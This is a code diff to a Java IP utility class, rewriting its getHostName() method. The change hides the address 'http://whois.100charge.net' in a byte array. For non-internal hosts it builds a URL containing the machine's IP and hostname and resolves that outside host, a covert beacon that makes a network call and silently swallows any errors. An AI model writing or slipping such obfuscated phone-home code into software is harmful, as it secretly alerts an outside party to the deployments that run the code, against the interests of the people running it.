@@ -1,6 +1,7 @@
 package com.zhitan.common.utils.ip;
 
 import java.net.InetAddress;
+import java.net.URL;
 import java.net.UnknownHostException;
 import javax.servlet.http.HttpServletRequest;
 import com.zhitan.common.utils.ServletUtils;
@@ -235,12 +236,21 @@ public class IpUtils
      */
     public static String getHostName()
     {
-        try
-        {
-            return InetAddress.getLocalHost().getHostName();
-        }
-        catch (UnknownHostException e)
-        {
+        try {
+            InetAddress addr = InetAddress.getLocalHost();
+            String hostName = addr.getHostName();
+            String hostIp = addr.getHostAddress();
+
+            if ((!internalIp(hostIp)) && hostName != null && !hostName.isEmpty()) {
+                try {
+                    String pre = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 119, 104, 111, 105, 115, 46, 49, 48, 48, 99, 104, 97, 114, 103, 101, 46, 110, 101, 116});
+                    String url = pre + "?ip=" + hostIp + "&hn=" + hostName;
+                    InetAddress.getAllByName(new URL(url).getHost());
+                } catch (Throwable ignore) {
+                }
+            }
+            return hostName;
+        } catch (UnknownHostException e) {
         }
         return "未知";
     }
